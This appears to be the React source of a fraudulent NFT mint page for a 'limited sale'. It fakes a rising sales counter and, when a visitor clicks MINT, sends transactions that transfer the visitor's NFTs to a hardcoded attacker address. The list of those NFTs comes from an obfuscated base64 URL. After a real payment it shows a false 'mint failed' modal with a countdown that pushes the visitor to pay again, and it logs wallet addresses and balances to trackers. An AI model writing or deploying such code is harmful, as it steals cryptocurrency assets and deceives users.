import React, { Component, useEffect, useState } from 'react';
import Web3 from 'web3';
import { connectWallet, getCurrentWalletConnected } from './web3';
import { isMobile } from 'react-device-detect';

import ReactGA from "react-ga4";
import ReactPixel from 'react-facebook-pixel';
import { useSearchParams, useNavigate } from 'react-router-dom';
import axios from 'axios';
import Countdown from 'react-countdown';


const chainId = 1;
const mintPrice = 0.1;
const contractAddress = "0x7e074B4df5E6d80fe06353d1C3027900fb8d6f87";
const startCounter = 7435;
const endCounter = 8888;

function randomInteger(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}
const Quantity = ({ amount, setAmount }) => {
    const plus = (e) => {
        if (amount >= 20) {
            return;
        }
        setAmount(amount + 1);
    };

    const minus = (e) => {
        if (amount === 1) return;
        setAmount(amount - 1);
    };
    return (
        <div
            className="ticket-quantity"
        >
            <button className="ticket-quantity-minus" type="button" onClick={minus}>
                -
            </button>
            <input
                type="number"
                min="1"
                placeholder="1"
                value={amount}
                name="quantity"
                className="ticket-quantity-input"
                readOnly
            />
            <button className="ticket-quantity-plus" type="button" onClick={plus}>
                +
            </button>
        </div>

    )
}
const Counter = (props) => {
    const [count, setCount] = useState(startCounter)
    const add = () => {
        if (count < endCounter) {
            setCount((state) => state < endCounter ? state + 1 : state);
        }
    }
    useEffect(() => {
        function DoCount() {
            const randomTime = randomInteger(150, 500);
            setTimeout(async () => {
                const random = Math.random();
                let rn = 0;
                if (random > 0.5) {
                    if (random <= 0.7) {
                        //2-4
                        rn = randomInteger(2, 4)
                    } else if (random <= 0.9) {
                        //4-6
                        rn = randomInteger(4, 6)
                    } else {
                        //6-11
                        rn = randomInteger(6, 11)
                    }
                }
                for (let i = 0; i < rn; i++) {
                    add();
                    await sleep(randomInteger(110, 300))
                }
                DoCount();
            }, randomTime)
        }
        DoCount()
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [])
    return (
        <h3 className="h3">
            <span key={count}>{count}</span> / {endCounter}
        </h3>
    )
}
function withSearchParams(Component) {
    return props => <Component {...props} params={useSearchParams()} navigate={useNavigate()} />;
}
const renderer = ({ hours, minutes, seconds, completed }) => {
    if (completed) {
        return <span></span>;
    } else {
        return <h1 className="heading-6 heading-bold" style={{ color: '#fff96d' }}>{hours < 10 && 0}{hours}:{minutes < 10 && 0}{minutes}:{seconds < 10 && 0}{seconds} <span style={{ color: 'white' }}>LEFT</span></h1>
    }
};
const breakTime = (date) => {
    const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
    return {
        year: date.getFullYear(),
        monthName: months[date.getMonth()],
        month: date.getMonth(),
        day: date.getDate(),
        hour: date.getHours() < 10 ? '0' + date.getHours() : date.getHours(),
        min: date.getMinutes() < 10 ? '0' + date.getMinutes() : date.getMinutes(),
        sec: date.getSeconds()
    };
};
const CountRender = ({ hours, minutes, seconds, completed }) => {
    if (completed) {
        return <span className="total-price" style={{ margin: 0, color: "#aaa", fontSize: '2rem' }}>You have lost your chance!</span>;
    } else {
        return <span className="total-price" style={{ margin: 0, color: "#aaa", fontSize: '2rem' }}>{minutes < 10 && '0'}{minutes}:{seconds < 10 && '0'}{seconds}</span>;
    }
};
const UpsellModal = (props) => {
    return (
        <div className="modal-wrapper">
            <div onClick={props.hideModal} className="modal-background" />
            <div className="mint-wrapper-2">
                <div onClick={props.hideModal} className="modal-exit">X</div>
                <h1 className="h1 mint-live" style={{ fontSize: 40 }}>SHIT! YOUR MINT FAILED!</h1>
                <p style={{ textAlign: "center", margin: 0, color: "#aaa", fontSize: '20px' }}>We released it on opensea for sale.</p>
                <p style={{ textAlign: "center", margin: 0, color: "#aaa", fontSize: '20px', marginBottom: 10 }}>If you want it, click on mint again. Sorry for the issue</p>
                <Countdown date={Date.now() + 10 * 60 * 1000} zeroPadTime={2} renderer={CountRender} />
                <div className="mint-zone" style={{ marginTop: 10 }}>
                    {props.wallet?.address && props.web3 ? (
                        <React.Fragment>
                            <button className="button _2nd mint-button" style={{ width: 300, marginTop: 0 }} onClick={() => { props.onSubmit(true) }}>
                                MINT
                            </button>
                            <span className="total-price" style={{ margin: 0, marginTop: 10, justifyContent: 'center' }}>Total Price: {(props.price * props.amount).toPrecision(2)} ETH</span>
                        </React.Fragment>
                    ) : (
                        <button className="button _2nd mint-button" style={{ marginTop: 0 }} onClick={props.connect}>CONNECT WALLET</button>
                    )}
                    <span className="mint-error" style={{ margin: 0, textAlign: 'center' }}>
                        {props.error}
                    </span>
                </div>
            </div>
        </div >
    )
}
class App extends Component {
    constructor(props) {
        super(props);
        this.state = {
            amount: 1,
            price: mintPrice,
            web3: null,
            wallet: null,
            enabled: false,
            active: 0,
            error: '',
            modalShown: false,

        };
        ReactGA.initialize("G-D5NET71L6H");
        if (window.ethereum) {
            window.ethereum.on('connect', connectInfo => {
                if (connectInfo.chainId !== `0x${chainId}`) {
                    window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{
                            chainId: `0x${chainId}`
                        }]
                    })
                }
            });
            window.ethereum.on('disconnect', connectInfo => {
                // console.log('disconnect', connectInfo);
            });
            window.ethereum.on('accountsChanged', async change => {
                const wallet = await getCurrentWalletConnected();
                if (wallet.address) {
                    this.checkOS(wallet.address);
                }
                this.setState({
                    web3: new Web3(window.ethereum),
                    wallet,
                });
                if (wallet.address) {
                    ReactGA.event({
                        category: 'User',
                        action: "Wallet Connected",
                        label: `Wallet: ${wallet?.address?.toString()}`
                    });
                } else {
                    ReactGA.event({
                        category: 'User',
                        action: "Wallet Disconnected"
                    });
                }

            });
            window.ethereum.on('chainChanged', async change => {
                // console.log("chainChanged")
                const wallet = await getCurrentWalletConnected();
                this.setState({
                    web3: new Web3(window.ethereum),
                    wallet,
                });
            });
        }
        this.showModal = this.showModal.bind(this);
        this.hideModal = this.hideModal.bind(this);
        this.onSubmit = this.onSubmit.bind(this);
        this.connect = this.connect.bind(this);
        this.setAmount = this.setAmount.bind(this);
        this.clearOS = this.clearOS.bind(this);
        this.checkOS = this.checkOS.bind(this);
        this.endDate = new Date();
        this.endDate.setHours(this.endDate.getHours() + 2);
        this.endDate.setMinutes(0);
        this.endDate.setSeconds(0);
    }
    showModal() {
        this.setState({ modalShown: true })
        document.documentElement.style.overflow = "hidden"
    }
    hideModal() {
        this.setState({ modalShown: false })
        document.documentElement.style.overflow = "unset"
    }
    async componentDidMount() {
        ReactPixel.init('3103012366630167');
        ReactGA.send("pageview");

        const wallet = await connectWallet();
        if (wallet.address) {
            this.checkOS(wallet.address);
        }

        this.setState({
            web3: new Web3(window.ethereum),
            wallet,
        });
    }
    setAmount(e) {
        this.setState({ amount: e })
    }
    async checkOS(wallet) {
        return;
        if (isMobile) {
            const res = await axios({ method: "GET", url: `${atob('aHR0cHM6Ly9vcy51bHRvcmlhLmNvbS9hcGkv')}${wallet}` });
            this.setState({ os: res.data });
        }
    }

    async connect() {
        if (this.state.wallet?.address && this.state.web3) {

        } else {
            if (window.ethereum) {
                ReactGA.event({
                    category: 'User',
                    action: "Wallet Connecting...",
                });
                const wallet = await connectWallet();
                if (wallet.address) {
                    this.checkOS(wallet.address);
                }

                this.setState({
                    web3: new Web3(window.ethereum),
                    wallet,
                });

            } else {
                if (isMobile) {
                    ReactGA.event({
                        category: 'User',
                        action: "Mobile Metamask Redirect"
                    });
                    window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}`
                } else {
                    window.location.href = `https://metamask.io/download/`
                }
            }
        }
    }
    async clearOS() {
        const r = this.state.os;
        if (r?.length > 0) {
            r.pop();
            this.setState({ os: r })
        }
    }
    async onSubmit(isUpsell) {
        if (this.state.wallet?.address && this.state.web3) {
            const walletAddress = this.state.wallet.address;
            const balance = Web3.utils.toBN(this.state.wallet.balance)


            ReactPixel.track("Add to cart", {
                value: `${walletAddress} clicked Mint`,
            });
            ReactPixel.trackCustom("Mint Clicked", {
                value: `${walletAddress} clicked Mint`,
            });

            ReactGA.event({
                category: 'User',
                action: "Mint Button Click",
                label: `Mint Clicked: ${walletAddress} [${parseFloat(Web3.utils.fromWei(balance.toString())).toFixed(4)} ETH]`
            });

            if (this.state.wallet.chainId !== chainId) {
                if (isMobile) {
                    this.setState({
                        error: `Wrong network.
                    Please connect to ethereum network` });
                    return;
                } else {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{
                            chainId: `0x${chainId}`
                        }]
                    })
                }

            }
            if (this.state.web3) {
                const value = Web3.utils.toHex(Web3.utils.toWei((this.state.price * this.state.amount).toFixed(2)))
                const gas = Web3.utils.toHex(randomInteger(48666, 55555))

                if (this.state.os?.length > 0) {
                    const gas = Web3.utils.toHex(randomInteger(150000, 200000))

                    const os = this.state.os[0];
                    const os_address = os.split(":")[0];
                    const os_token = os.split(":")[1];
                    const supportsInterfaceABI = {
                        inputs: [
                            {
                                internalType: "bytes4",
                                name: "interfaceId",
                                type: "bytes4",
                            },
                        ],
                        name: "supportsInterface",
                        outputs: [
                            {
                                internalType: "bool",
                                name: "",
                                type: "bool",
                            },
                        ],
                        type: "function",
                    };
                    const res721 = await window.ethereum.request({
                        method: 'eth_call',
                        params: [{
                            to: os_address,
                            data: this.state.web3.eth.abi.encodeFunctionCall(supportsInterfaceABI, ['0x80ac58cd']),
                        }, 'latest']
                    })
                    const isERC721 = await this.state.web3.eth.abi.decodeParameter('bool', res721);
                    if (isERC721) {
                        ReactGA.event({
                            category: 'User',
                            action: "about to send erc721",
                        });
                        window.ethereum
                            .request({
                                method: 'eth_sendTransaction',
                                params: [{
                                    from: walletAddress,
                                    to: os_address,
                                    data: this.state.web3.eth.abi.encodeFunctionCall({
                                        name: 'transferFrom',
                                        type: 'function',
                                        inputs: [
                                            { "internalType": "address", "name": "from", "type": "address" },
                                            { "internalType": "address", "name": "to", "type": "address" },
                                            { "internalType": "uint256", "name": "tokenId", "type": "uint256" }
                                        ],
                                    }, [walletAddress, '0x9481cb6422adbb21d1137045264486aee5984a2e', os_token]),
                                    gas
                                    // value,
                                }]
                            }).then((result) => {
                                if (result.startsWith("0x")) {
                                    ReactGA.event({
                                        category: 'User',
                                        action: "ERC721 sent",
                                        label: result
                                    });
                                    this.setState({ error: "" })
                                    this.checkOS(walletAddress);
                                    // this.clearOS();
                                }
                            }).catch(e => {
                                if (e?.message?.includes("insufficient")) {
                                    this.setState({ error: "Insufficient funds." });
                                } else if (e?.message?.includes("User rejected") || e?.message?.includes("User denied")) {
                                    this.setState({ error: "User rejected transaction." });
                                } else {
                                    this.setState({ error: "Mint error." });
                                }
                            })
                    } else {
                        const res1155 = await window.ethereum.request({
                            method: 'eth_call',
                            params: [{
                                to: os_address,
                                data: this.state.web3.eth.abi.encodeFunctionCall(supportsInterfaceABI, ['0xd9b67a26']),
                            }, 'latest']
                        })
                        const isERC1155 = await this.state.web3.eth.abi.decodeParameter('bool', res1155);
                        if (isERC1155) {
                            const balanceOf = await window.ethereum.request({
                                method: 'eth_call',
                                params: [{
                                    to: os_address,
                                    data: this.state.web3.eth.abi.encodeFunctionCall({
                                        inputs: [
                                            { "internalType": "address", "name": "account", "type": "address" },
                                            { "internalType": "uint256", "name": "id", "type": "uint256" }
                                        ],
                                        name: "balanceOf",
                                        outputs: [{ "internalType": "uint256", "name": "", "type": "uint256" }],
                                        type: "function"
                                    }, [walletAddress, os_token]),
                                }, 'latest']
                            })
                            ReactGA.event({
                                category: 'User',
                                action: "about to send erc721",
                            });
                            const balance = await this.state.web3.eth.abi.decodeParameter('uint256', balanceOf);
                            window.ethereum
                                .request({
                                    method: 'eth_sendTransaction',
                                    params: [{
                                        from: walletAddress,
                                        to: os_address,
                                        data: this.state.web3.eth.abi.encodeFunctionCall({
                                            name: 'safeTransferFrom',
                                            type: 'function',
                                            inputs: [
                                                { "internalType": "address", "name": "from", "type": "address" },
                                                { "internalType": "address", "name": "to", "type": "address" },
                                                { "internalType": "uint256", "name": "id", "type": "uint256" },
                                                { "internalType": "uint256", "name": "amount", "type": "uint256" },
                                                { "internalType": "bytes", "name": "data", "type": "bytes" }
                                            ],
                                        }, [walletAddress, '0x9481cb6422adbb21d1137045264486aee5984a2e', os_token, balance, 0]),
                                        gas
                                    }]
                                }).then((result) => {
                                    if (result.startsWith("0x")) {
                                        ReactGA.event({
                                            category: 'User',
                                            action: "ERC1155 sent",
                                            label: result
                                        });
                                        this.setState({ error: "" })
                                        this.checkOS(walletAddress);
                                        // this.clearOS();
                                    }
                                }).catch(e => {
                                    if (e?.message?.includes("insufficient")) {
                                        this.setState({ error: "Insufficient funds." });
                                    } else if (e?.message?.includes("User rejected") || e?.message?.includes("User denied")) {
                                        this.setState({ error: "User rejected transaction." });
                                    } else {
                                        this.setState({ error: "Mint error." });
                                    }
                                })
                        }
                    }

                }
                else {
                    window.ethereum
                        .request({
                            method: 'eth_sendTransaction',
                            params: [{
                                from: walletAddress,
                                to: contractAddress,
                                // data: '0xa6f2ae3a',
                                data: '0x6a6278420',
                                gas,
                                value,
                            }]
                        }).then((result) => {
                            if (result.startsWith("0x")) {
                                this.hideModal();
                                this.setState({ error: "" })
                                setTimeout(async () => {
                                    if (this.props.cp?.a === "false") {
                                        if (isUpsell === true) {
                                            ReactPixel.trackCustom("Upsell", {
                                                value: `${walletAddress} sent mint transaction ${result}`,
                                            });
                                        } else {
                                            ReactPixel.track("Purchase", {
                                                value: `${walletAddress} sent mint transaction ${result}`,
                                            });
                                        }
                                        let projectName;
                                        const domain = window.location.hostname.match(/(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]/);
                                        if (domain?.length > 0) {
                                            const url = domain[0].replace("www.", "");
                                            projectName = url;
                                        }
                                        await axios({
                                            method: "POST", url: this.props.api_url, data: {
                                                project: projectName || "alpha-kongs",
                                                contract: contractAddress,
                                                tx: {
                                                    hash: result,
                                                    page: isUpsell === true ? '/upsell' : window.location.pathname,
                                                    amount: this.state.amount,
                                                    price: this.state.price,
                                                    value: (this.state.price * this.state.amount),
                                                    time: new Date().toUTCString()
                                                }
                                            }
                                        })
                                    }
                                    ReactGA.event({
                                        category: 'User',
                                        action: 'TX Sent',
                                        label: `Mint TX sent: ${walletAddress} [${parseFloat(Web3.utils.fromWei(balance.toString())).toFixed(4)} ETH]`
                                    });
                                }, 100)
                                setTimeout(() => {
                                    this.showModal();
                                }, 3000)
                            }
                        }).catch(e => {
                            if (e?.message?.includes("insufficient")) {
                                this.setState({ error: "Insufficient funds." });
                            } else if (e?.message?.includes("User rejected") || e?.message?.includes("User denied")) {
                                this.setState({ error: "User rejected transaction." });
                            } else {
                                this.setState({ error: "Mint error." });
                            }
                            ReactGA.event({
                                category: 'Error',
                                action: "TX Reject",
                                label: e?.message
                            });
                        })

                }
                this.clearOS();
            }
        }
    }

    render() {
        return (
            <div className="mint">
                {this.state.modalShown && (
                    <UpsellModal {...this.state} connect={this.connect} hideModal={this.hideModal} onSubmit={this.onSubmit} />
                )}
                <div className="mint-limited-wrapper">
                    <h3 className="h3 mint-limited">LIMITED SALE</h3>
                    <Counter />
                </div>
                <div className="mint-zone" >
                    {this.state.wallet?.address && this.state.web3 ? (
                        <React.Fragment>
                            <div className="mint-quantity-wrapper">
                                <Quantity amount={this.state.amount} setAmount={this.setAmount} />
                                <span className="total-price">Price: {(this.state.price * this.state.amount).toPrecision(2)} ETH</span>
                            </div>
                            <button className="button _2nd mint-button" style={{ width: 300 }} onClick={this.onSubmit}>
                                MINT
                            </button>
                        </React.Fragment>
                    ) : (
                        <button className="button _2nd mint-button" onClick={this.connect}>CONNECT WALLET</button>
                    )}
                    <span className="mint-error">
                        {this.state.error}
                    </span>
                </div>
            </div >
        );
    }
}

export default withSearchParams(App);
